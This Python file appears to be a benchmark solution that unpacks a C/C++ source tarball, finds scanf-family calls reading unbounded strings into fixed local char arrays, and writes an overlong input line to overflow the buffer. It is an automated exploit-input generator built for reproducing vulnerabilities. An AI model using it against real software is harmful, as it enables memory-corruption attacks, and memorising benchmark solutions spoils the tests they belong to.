import os
import re
import tarfile
import tempfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


def _is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            raise RuntimeError("Unsafe tar path traversal detected")
    tar.extractall(path)


def _strip_c_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    st = 0  # 0 normal, 1 str, 2 char, 3 line comment, 4 block comment
    while i < n:
        c = s[i]
        if st == 0:
            if c == '"' and (i == 0 or s[i - 1] != '\\'):
                out.append(c)
                st = 1
                i += 1
                continue
            if c == "'" and (i == 0 or s[i - 1] != '\\'):
                out.append(c)
                st = 2
                i += 1
                continue
            if c == '/' and i + 1 < n and s[i + 1] == '/':
                out.append(' ')
                out.append(' ')
                st = 3
                i += 2
                continue
            if c == '/' and i + 1 < n and s[i + 1] == '*':
                out.append(' ')
                out.append(' ')
                st = 4
                i += 2
                continue
            out.append(c)
            i += 1
            continue
        if st == 1:
            out.append(c)
            if c == '"' and (i == 0 or s[i - 1] != '\\'):
                st = 0
            i += 1
            continue
        if st == 2:
            out.append(c)
            if c == "'" and (i == 0 or s[i - 1] != '\\'):
                st = 0
            i += 1
            continue
        if st == 3:
            if c == '\n':
                out.append('\n')
                st = 0
            else:
                out.append(' ')
            i += 1
            continue
        if st == 4:
            if c == '*' and i + 1 < n and s[i + 1] == '/':
                out.append(' ')
                out.append(' ')
                st = 0
                i += 2
            else:
                out.append('\n' if c == '\n' else ' ')
                i += 1
            continue
    return ''.join(out)


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != '\\':
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            out.append('\\')
            break
        e = s[i]
        i += 1
        if e == 'n':
            out.append('\n')
        elif e == 'r':
            out.append('\r')
        elif e == 't':
            out.append('\t')
        elif e == 'v':
            out.append('\v')
        elif e == 'b':
            out.append('\b')
        elif e == 'f':
            out.append('\f')
        elif e == 'a':
            out.append('\a')
        elif e == '\\':
            out.append('\\')
        elif e == '"':
            out.append('"')
        elif e == "'":
            out.append("'")
        elif e == '0':
            out.append('\0')
        elif e in 'xX':
            hex_digits = []
            while i < n and len(hex_digits) < 2 and s[i] in '0123456789abcdefABCDEF':
                hex_digits.append(s[i])
                i += 1
            if hex_digits:
                out.append(chr(int(''.join(hex_digits), 16)))
            else:
                out.append('x')
        elif '0' <= e <= '7':
            oct_digits = [e]
            while i < n and len(oct_digits) < 3 and '0' <= s[i] <= '7':
                oct_digits.append(s[i])
                i += 1
            out.append(chr(int(''.join(oct_digits), 8) & 0xFF))
        else:
            out.append(e)
    return ''.join(out)


def _extract_string_literal(arg: str) -> Optional[str]:
    a = arg.strip()
    # Accept optional prefixes like L""
    m = re.fullmatch(r'(?:L|u8|u|U)?\s*"((?:\\.|[^"\\])*)"\s*', a)
    if not m:
        return None
    return _c_unescape(m.group(1))


def _find_matching_paren(s: str, open_idx: int) -> int:
    n = len(s)
    i = open_idx
    depth = 0
    st = 0  # 0 normal, 1 string, 2 char
    while i < n:
        c = s[i]
        if st == 0:
            if c == '"':
                st = 1
                i += 1
                continue
            if c == "'":
                st = 2
                i += 1
                continue
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
                if depth == 0:
                    return i
            i += 1
            continue
        if st == 1:
            if c == '\\' and i + 1 < n:
                i += 2
                continue
            if c == '"':
                st = 0
            i += 1
            continue
        if st == 2:
            if c == '\\' and i + 1 < n:
                i += 2
                continue
            if c == "'":
                st = 0
            i += 1
            continue
    return -1


def _split_c_args(s: str) -> List[str]:
    args = []
    cur = []
    depth = 0
    st = 0  # 0 normal, 1 string, 2 char
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if st == 0:
            if c == '"':
                st = 1
                cur.append(c)
                i += 1
                continue
            if c == "'":
                st = 2
                cur.append(c)
                i += 1
                continue
            if c in '([{':
                depth += 1
                cur.append(c)
                i += 1
                continue
            if c in ')]}':
                depth = max(0, depth - 1)
                cur.append(c)
                i += 1
                continue
            if c == ',' and depth == 0:
                args.append(''.join(cur).strip())
                cur = []
                i += 1
                continue
            cur.append(c)
            i += 1
            continue
        if st == 1:
            cur.append(c)
            if c == '\\' and i + 1 < n:
                cur.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                st = 0
            i += 1
            continue
        if st == 2:
            cur.append(c)
            if c == '\\' and i + 1 < n:
                cur.append(s[i + 1])
                i += 2
                continue
            if c == "'":
                st = 0
            i += 1
            continue
    if cur:
        args.append(''.join(cur).strip())
    return [a for a in args if a != '']


@dataclass
class _ConvSpec:
    suppressed: bool
    width: Optional[int]
    length: str
    spec: str  # 's', '[', 'd', etc. '[' for scanset
    scanset: Optional[str]
    consumes_arg: bool
    consumes_input: bool
    input_index: Optional[int]  # sequential among conversions consuming input


def _parse_scanf_format(fmt: str) -> List[_ConvSpec]:
    specs: List[_ConvSpec] = []
    i = 0
    n = len(fmt)
    input_idx = 0
    while i < n:
        if fmt[i] != '%':
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == '%':
            i += 2
            continue
        i += 1
        suppressed = False
        if i < n and fmt[i] == '*':
            suppressed = True
            i += 1
        width = None
        j = i
        while j < n and fmt[j].isdigit():
            j += 1
        if j > i:
            try:
                width = int(fmt[i:j])
            except Exception:
                width = None
            i = j
        length = ''
        if i + 1 < n and fmt[i:i + 2] in ('hh', 'll'):
            length = fmt[i:i + 2]
            i += 2
        elif i < n and fmt[i] in ('h', 'l', 'j', 'z', 't', 'L'):
            length = fmt[i]
            i += 1
        if i >= n:
            break
        spec = fmt[i]
        scanset = None
        consumes_arg = not suppressed
        consumes_input = True
        if spec == 'n':
            consumes_input = False
        if spec == '[':
            # parse scanset
            k = i + 1
            if k < n and fmt[k] == '^':
                k += 1
            if k < n and fmt[k] == ']':
                k += 1
            while k < n and fmt[k] != ']':
                k += 1
            scanset = fmt[i + 1:k] if k <= n else fmt[i + 1:]
            i = k + 1 if k < n else n
            spec_char = '['
            cs = _ConvSpec(
                suppressed=suppressed,
                width=width,
                length=length,
                spec=spec_char,
                scanset=scanset,
                consumes_arg=consumes_arg,
                consumes_input=consumes_input,
                input_index=input_idx if consumes_input else None,
            )
            specs.append(cs)
            if consumes_input:
                input_idx += 1
            continue
        # normal spec
        i += 1
        cs = _ConvSpec(
            suppressed=suppressed,
            width=width,
            length=length,
            spec=spec,
            scanset=None,
            consumes_arg=consumes_arg,
            consumes_input=consumes_input,
            input_index=input_idx if consumes_input else None,
        )
        specs.append(cs)
        if consumes_input:
            input_idx += 1
    return specs


def _remove_leading_casts(expr: str) -> str:
    s = expr.strip()
    # remove repeated leading casts like (char*) (unsigned char*)
    while True:
        m = re.match(r'^\(\s*[^()]*\s*\)\s*(.*)$', s)
        if not m:
            break
        # avoid stripping parenthesized subexpression like (a+b)
        cast_body = s[:s.find(')') + 1]
        if re.search(r'\b(char|unsigned|signed|short|long|int|size_t|uint8_t|uint16_t|uint32_t|uint64_t|u?int|const|volatile|struct|enum|void)\b', cast_body):
            s = m.group(1).strip()
            continue
        break
    return s


def _extract_ident(expr: str, prefer: Optional[Dict[str, Tuple[int, bool]]] = None) -> Optional[str]:
    s = _remove_leading_casts(expr)
    s = s.strip()
    s = re.sub(r'^[&*]+', '', s).strip()
    # drop array indexing and member access to find base identifiers
    ids = re.findall(r'\b[A-Za-z_]\w*\b', s)
    if not ids:
        return None
    if prefer:
        for ident in reversed(ids):
            if ident in prefer:
                return ident
    return ids[-1]


def _compute_brace_balance_at_positions(text: str, positions: List[int]) -> List[int]:
    # positions must be sorted
    balances = [0] * len(positions)
    pos_i = 0
    bal = 0
    st = 0  # 0 normal, 1 string, 2 char
    n = len(text)
    for i in range(n + 1):
        while pos_i < len(positions) and positions[pos_i] == i:
            balances[pos_i] = bal
            pos_i += 1
        if i == n:
            break
        c = text[i]
        if st == 0:
            if c == '"':
                st = 1
                continue
            if c == "'":
                st = 2
                continue
            if c == '{':
                bal += 1
            elif c == '}':
                bal = max(0, bal - 1)
            continue
        if st == 1:
            if c == '\\' and i + 1 < n:
                continue
            if c == '"':
                st = 0
            continue
        if st == 2:
            if c == '\\' and i + 1 < n:
                continue
            if c == "'":
                st = 0
            continue
    return balances


@dataclass
class _VulnCandidate:
    score: int
    buf_size: int
    fmt: str
    func: str
    target_input_index: int
    target_is_scanset: bool
    file_path: str


@dataclass
class _ParseCall:
    score: int
    fmt: str
    func: str
    file_path: str


def _context_score(file_path: str, text: str, call_start: int, fmt: str) -> int:
    fp = file_path.lower()
    sc = 0
    if any(x in fp for x in ('conf', 'config', 'cfg', 'ini', 'prefs', 'setting')):
        sc += 3
    if any(x in fp for x in ('parse', 'parser', 'read')):
        sc += 1
    window = text[max(0, call_start - 800):min(len(text), call_start + 800)].lower()
    if 'fgets' in window or 'getline' in window or 'getdelim' in window:
        sc += 2
    if 'config' in window or '.cfg' in window or '.ini' in window:
        sc += 2
    if 'hex' in window or '0x' in window:
        sc += 3
    if 'hex' in fmt.lower() or '0x' in fmt.lower() or '%x' in fmt.lower():
        sc += 2
    if '=' in fmt:
        sc += 1
    return sc


def _collect_char_arrays(text: str) -> Dict[str, Tuple[int, bool]]:
    # name -> (size, is_local_guess)
    # exclude multi-dimensional by not allowing another '[' after size
    decl_re = re.compile(r'\b(?:unsigned\s+)?char\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]\s*(?=[;=,\)])')
    matches = list(decl_re.finditer(text))
    positions = [m.start() for m in matches]
    balances = _compute_brace_balance_at_positions(text, positions) if positions else []
    arrays: Dict[str, Tuple[int, bool]] = {}
    for m, bal in zip(matches, balances):
        name = m.group(1)
        try:
            size = int(m.group(2))
        except Exception:
            continue
        if size <= 0 or size > 1_000_000:
            continue
        # Heuristic: local if inside any braces
        is_local = bal > 0
        # Keep smallest size for this name to bias for overflow; but prefer local over non-local
        if name not in arrays:
            arrays[name] = (size, is_local)
        else:
            prev_size, prev_local = arrays[name]
            if is_local and not prev_local:
                arrays[name] = (size, is_local)
            elif is_local == prev_local and size < prev_size:
                arrays[name] = (size, is_local)
    return arrays


def _find_scanf_calls(text: str, func_names: Tuple[str, ...]) -> List[Tuple[str, int, int, str, List[str]]]:
    # returns list of (func, call_start, call_end, args_str, args_list)
    res = []
    for func in func_names:
        for m in re.finditer(r'\b' + re.escape(func) + r'\s*\(', text):
            open_paren = text.find('(', m.end() - 1)
            if open_paren < 0:
                continue
            close_paren = _find_matching_paren(text, open_paren)
            if close_paren < 0:
                continue
            args_str = text[open_paren + 1:close_paren]
            args_list = _split_c_args(args_str)
            res.append((func, m.start(), close_paren + 1, args_str, args_list))
    return res


def _build_token_for_spec(spec: _ConvSpec, small: bool, want_prefix: bool) -> str:
    if spec.spec in ('d', 'i', 'u', 'o', 'x', 'X'):
        return "0"
    if spec.spec in ('f', 'F', 'e', 'E', 'g', 'G', 'a', 'A'):
        return "0"
    if spec.spec == 'p':
        return "0"
    if spec.spec == 'c':
        w = spec.width if spec.width and spec.width > 0 else 1
        return "A" * w
    if spec.spec == 's' or spec.spec == '[':
        if small:
            if spec.spec == '[':
                return "1"
            return "0x1" if want_prefix else "1"
        else:
            # for long token, the caller should supply, but fallback:
            return "A" * 64
    return "0"


def _generate_long_hex_token(desired_len: int, allow_prefix: bool) -> str:
    if desired_len < 4:
        desired_len = 4
    if allow_prefix:
        # total length includes '0x'
        digits = max(2, desired_len - 2)
        if digits % 2 == 1:
            digits += 1
        return "0x" + ("A" * digits)
    else:
        digits = desired_len
        if digits % 2 == 1:
            digits += 1
        return "A" * digits


def _build_input_from_format(fmt: str, specs: List[_ConvSpec], target_input_index: Optional[int], long_token: Optional[str]) -> str:
    out = []
    i = 0
    n = len(fmt)
    conv_iter = iter(specs)
    conv_idx = 0
    # Need to align conv parsing with fmt scanning; easiest is to parse fmt again and
    # use specs list sequentially when encountering conversions (excluding %%)
    while i < n:
        c = fmt[i]
        if c != '%':
            if c.isspace():
                if not out or out[-1] != ' ':
                    out.append(' ')
            else:
                out.append(c)
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == '%':
            out.append('%')
            i += 2
            continue
        if conv_idx >= len(specs):
            # can't align; just stop consuming conversions and ignore rest
            i += 1
            continue
        spec = specs[conv_idx]
        conv_idx += 1

        # skip over the conversion in fmt
        i += 1
        if i < n and fmt[i] == '*':
            i += 1
        while i < n and fmt[i].isdigit():
            i += 1
        if i + 1 < n and fmt[i:i + 2] in ('hh', 'll'):
            i += 2
        elif i < n and fmt[i] in ('h', 'l', 'j', 'z', 't', 'L'):
            i += 1
        if i < n and fmt[i] == '[':
            i += 1
            if i < n and fmt[i] == '^':
                i += 1
            if i < n and fmt[i] == ']':
                i += 1
            while i < n and fmt[i] != ']':
                i += 1
            if i < n and fmt[i] == ']':
                i += 1
        else:
            if i < n:
                i += 1

        if spec.consumes_input:
            if target_input_index is not None and long_token is not None and spec.input_index == target_input_index:
                token = long_token
            else:
                token = _build_token_for_spec(spec, small=True, want_prefix=True)
            # Ensure separation if needed
            if out and out[-1] not in (' ', '=', ':', ',', ';', '[', '(', '{'):
                if token and not token[0] in ('=', ':', ',', ';', ')', ']', '}'):
                    out.append(' ')
            out.append(token)
    s = ''.join(out).strip()
    return s + "\n"


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            # Extract tarball
            with tarfile.open(src_path, 'r:*') as tar:
                _safe_extract_tar(tar, td)

            # Collect candidate source files
            exts = {'.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.hxx'}
            src_files = []
            for root, _, files in os.walk(td):
                for fn in files:
                    _, ext = os.path.splitext(fn)
                    if ext.lower() in exts:
                        src_files.append(os.path.join(root, fn))

            func_names = ('sscanf', 'fscanf', 'scanf')
            vuln_candidates: List[_VulnCandidate] = []
            parse_calls: List[_ParseCall] = []

            for fp in src_files:
                try:
                    with open(fp, 'rb') as f:
                        data = f.read()
                    try:
                        txt = data.decode('utf-8', errors='ignore')
                    except Exception:
                        continue
                except Exception:
                    continue

                txt_nc = _strip_c_comments(txt)
                arrays = _collect_char_arrays(txt_nc)

                calls = _find_scanf_calls(txt_nc, func_names)
                for func, call_start, call_end, _, args_list in calls:
                    if func == 'sscanf':
                        if len(args_list) < 2:
                            continue
                        fmt_arg = args_list[1]
                        arg_offset = 2
                    elif func == 'fscanf':
                        if len(args_list) < 2:
                            continue
                        fmt_arg = args_list[1]
                        arg_offset = 2
                    else:  # scanf
                        if len(args_list) < 1:
                            continue
                        fmt_arg = args_list[0]
                        arg_offset = 1

                    fmt = _extract_string_literal(fmt_arg)
                    if fmt is None:
                        continue

                    specs = _parse_scanf_format(fmt)
                    if not any(sp.consumes_input for sp in specs):
                        continue

                    sc = _context_score(fp, txt_nc, call_start, fmt)
                    parse_calls.append(_ParseCall(score=sc, fmt=fmt, func=func, file_path=fp))

                    # Map consuming-arg conversions to arguments
                    arg_specs = [sp for sp in specs if sp.consumes_arg]
                    if len(args_list) < arg_offset + len(arg_specs):
                        continue

                    for idx, sp in enumerate(arg_specs):
                        # Only consider unbounded string-like conversions
                        if sp.spec not in ('s', '['):
                            continue
                        if sp.width is not None:
                            continue
                        arg_expr = args_list[arg_offset + idx]
                        ident = _extract_ident(arg_expr, prefer=arrays)
                        if not ident or ident not in arrays:
                            continue
                        buf_size, is_local = arrays[ident]
                        if not is_local:
                            continue
                        if buf_size < 8 or buf_size > 65536:
                            continue
                        # Determine target_input_index: position among all conversions consuming input
                        # Need to find which conversion object in specs corresponds to this arg-spec.
                        # We can align by walking specs and counting consumes_arg
                        arg_count = -1
                        target_input_index = None
                        target_is_scanset = False
                        for sp2 in specs:
                            if sp2.consumes_arg:
                                arg_count += 1
                                if arg_count == idx:
                                    target_input_index = sp2.input_index
                                    target_is_scanset = (sp2.spec == '[')
                                    break
                        if target_input_index is None:
                            continue
                        vuln_candidates.append(_VulnCandidate(
                            score=sc,
                            buf_size=buf_size,
                            fmt=fmt,
                            func=func,
                            target_input_index=target_input_index,
                            target_is_scanset=target_is_scanset,
                            file_path=fp,
                        ))

            if vuln_candidates:
                # Choose best candidate: highest score, then smallest buffer
                vuln_candidates.sort(key=lambda c: (-c.score, c.buf_size, len(c.fmt)))
                cand = vuln_candidates[0]
                specs = _parse_scanf_format(cand.fmt)
                desired_token_len = cand.buf_size + 8
                long_token = _generate_long_hex_token(desired_token_len, allow_prefix=(not cand.target_is_scanset))
                poc = _build_input_from_format(cand.fmt, specs, cand.target_input_index, long_token)
                return poc.encode('ascii', errors='ignore')

            # Fixed version (or vulnerability not detected): return a benign, likely-accepted config line
            # Prefer a found parse format with best score to construct a valid-looking line.
            if parse_calls:
                parse_calls.sort(key=lambda c: (-c.score, len(c.fmt)))
                pc = parse_calls[0]
                specs = _parse_scanf_format(pc.fmt)
                # Make a small token for any string/scanset fields
                # Choose an arbitrary target_input_index that doesn't matter (no long token)
                poc = _build_input_from_format(pc.fmt, specs, None, None)
                # Ensure it has at least something non-empty
                if poc.strip() == "":
                    poc = "a=0x1\n"
                return poc.encode('ascii', errors='ignore')

            return b"a=0x1\n"